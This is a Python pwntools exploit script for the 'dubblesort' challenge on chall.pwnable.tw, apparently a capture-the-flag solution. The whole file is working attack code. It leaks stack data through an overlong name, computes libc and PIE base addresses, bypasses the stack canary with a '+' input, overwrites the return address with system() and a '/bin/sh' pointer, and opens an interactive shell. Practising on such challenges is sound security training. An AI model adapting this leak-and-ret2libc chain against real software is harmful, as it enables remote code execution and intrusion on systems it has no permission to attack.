from pwn import *

p32 = lambda x: struct.pack("<L",x) #unsigned long
up32 = lambda x: struct.unpack("<L", x)[0] #unpack unsigned long

addr = "chall.pwnable.tw"
port = 10101
binary = "./dubblesort"

s = remote(addr, port)

def enter(value):
    sleep(0.1)
    print s.recvuntil("Enter the ")
    print s.recvuntil("number : ")
    s.sendline(value)

def leak():
    payload = "A"*28
    s.send(payload)
    sleep(0.3)
    s.recvuntil("Hello " + "A"*28)
    return s.recv(8)

def exploit(system_libc, binsh):
    number = 35
    print s.recvuntil(",How many numbers do you what to sort :")
    s.sendline(str(number))

    for i in range(0,24):
       enter(str(i+1))

    enter("+")
    enter(str(system_libc))
    enter(str(system_libc))
    enter(str(system_libc))
    enter(str(system_libc))
    enter(str(system_libc))
    enter(str(system_libc))
    enter(str(system_libc))
    enter(str(system_libc))
    enter(str(binsh))
    enter(str(binsh))
    sleep(0.3)
    print s.recvuntil("Processing.....")
    print s.recvuntil("Result :")
    print s.recv(4096)


print s.recvuntil("What your name :")

base = leak()

system_libc = up32(base[:4])-0x173904
pie_base = up32(base[4:]) - 0x601
#one_shot = system_libc + 0x24726
binsh = system_libc + 0x11e54b
print "[+] system_libc : %x" % system_libc
print "[+] pie_base : %x" % pie_base

exploit(system_libc,binsh)

s.interactive()
s.close()
